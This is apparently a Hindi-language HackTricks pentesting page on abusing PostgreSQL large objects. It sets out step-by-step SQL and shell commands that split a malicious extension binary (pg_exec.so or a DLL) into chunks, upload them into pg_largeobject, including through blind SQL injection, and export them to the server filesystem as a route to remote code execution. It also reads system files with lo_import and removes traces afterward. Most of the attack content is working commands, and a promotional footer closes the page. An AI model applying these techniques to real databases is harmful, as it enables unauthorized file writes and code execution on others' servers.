```bash
split -b 2048 your_binary
```

यह आपके बाइनरी फाइल को 2KB के टुकड़ों में विभाजित कर देगा।

एक बार जब आपके पास ये टुकड़े हों, तो आपको उन्हें PostgreSQL डेटाबेस में डालने के लिए निम्नलिखित कमांड्स का उपयोग करना होगा:

```sql
SELECT lo_create(0);
```

यह एक नया LOID बनाएगा।

```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (12345, 0, decode('your_hex_encoded_chunk', 'hex'));
```

यह आपके चंक को बनाए गए LOID के साथ डेटाबेस में डालेगा। आपको प्रत्येक चंक के लिए `pageno` को बढ़ाना होगा।

अंत में, आप निम्नलिखित कमांड का उपयोग करके डेटाबेस से फाइल को वापस निकाल सकते हैं:

```sql
SELECT lo_export(12345, '/tmp/your_binary');
```

यह डेटाबेस से फाइल को फाइल सिस्टम में वापस निकालेगा।
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
आपके द्वारा बनाई गई प्रत्येक फाइल को Base64 या Hex में एन्कोड करने के लिए आप इस्तेमाल कर सकते हैं:
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
इसका फायदा उठाते समय याद रखें कि आपको **2KB के स्पष्ट-पाठ बाइट्स के चंक्स** भेजने होंगे (2KB के base64 या hex encoded बाइट्स के नहीं)। यदि आप इसे स्वचालित करने की कोशिश करते हैं, तो **hex encoded** फाइल का आकार **दोगुना** होता है (फिर आपको प्रत्येक चंक के लिए 4KB का encoded डेटा भेजना होगा) और **base64** encoded फाइल का आकार `ceil(n / 3) * 4` होता है।
{% endhint %}

इस प्रक्रिया को डीबग करते समय आप बनाए गए बड़े ऑब्जेक्ट्स की सामग्री देख सकते हैं:
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# lo\_creat और Base64 का उपयोग करना

सबसे पहले, हमें एक LOID बनाने की आवश्यकता है जहां बाइनरी डेटा को सहेजा जाएगा:
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
यदि आप **Blind SQLinjection** का दुरुपयोग कर रहे हैं, तो आप `lo_create` का उपयोग **निश्चित LOID** के साथ करने में अधिक रुचि रखेंगे ताकि आप **जान सकें कि** आपको **कहाँ** **सामग्री** **अपलोड** करनी है।\
यह भी ध्यान दें कि कोई सिंटैक्स त्रुटि नहीं है, फंक्शन्स `lo_creat` और `lo_create` हैं।

LOID का उपयोग `pg_largeobject` तालिका में ऑब्जेक्ट की पहचान के लिए किया जाता है। `pg_largeobject` तालिका में 2KB के आकार के चंक्स डालने के लिए निम्नलिखित का उपयोग किया जा सकता है:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
अंत में आप फाइल को फाइल-सिस्टम में निर्यात कर सकते हैं (इस उदाहरण के दौरान प्रयुक्त LOID `173454` था):
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
नवीनतम postgres संस्करणों में आपको किसी भी पथ का संकेत दिए बिना **extensions अपलोड करने की आवश्यकता हो सकती है**। [**अधिक जानकारी के लिए यह पढ़ें**।](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

आपको निर्यात करने के बाद बनाई गई बड़ी ऑब्जेक्ट को हटाने में रुचि हो सकती है:
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# lo_import और Hex का उपयोग करना

इस परिदृश्य में lo_import का उपयोग एक बड़ी ऑब्जेक्ट ऑब्जेक्ट बनाने के लिए किया जाएगा। सौभाग्य से इस मामले में आप LOID का चयन कर सकते हैं (और नहीं भी कर सकते) जिसे आप उपयोग करना चाहेंगे:
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
ऑब्जेक्ट बनाने के बाद आप प्रत्येक पेज पर डेटा डालना शुरू कर सकते हैं (याद रखें, आपको 2KB के चंक्स में डेटा डालना होगा):
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
HEX केवल हेक्स होना चाहिए (बिना `0x` या `\x` के), उदाहरण:
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
अंत में, डेटा को एक फाइल में निर्यात करें और बड़े ऑब्जेक्ट को हटा दें:
```sql
select lo_export(173454, 'C:\\path\to\pg_extension.dll');
select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
नवीनतम संस्करणों में आपको **एक्सटेंशन्स को किसी भी पथ का संकेत दिए बिना अपलोड करना पड़ सकता है**. [**अधिक जानकारी के लिए यह पढ़ें**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# सीमाएँ

PostgreSQL में बड़ी ऑब्जेक्ट्स के दस्तावेज़ को पढ़ने के बाद, हम पता लगा सकते हैं कि **बड़ी ऑब्जेक्ट्स में ACL हो सकता है** (एक्सेस कंट्रोल लिस्ट). यह संभव है कि **नई बड़ी ऑब्जेक्ट्स को कॉन्फ़िगर किया जा सकता है** ताकि आपका यूज़र **पर्याप्त अधिकार नहीं रखता हो** उन्हें पढ़ने के लिए, भले ही वे आपके यूज़र द्वारा बनाए गए हों.

हालांकि, हो सकता है कि **पुरानी ऑब्जेक्ट में एक ACL हो जो वर्तमान यूज़र को इसे पढ़ने की अनुमति देता हो**, तब हम उस ऑब्जेक्ट की सामग्री को बाहर निकाल सकते हैं.


<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग प्राप्त करें**](https://peass.creator-spring.com)
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>
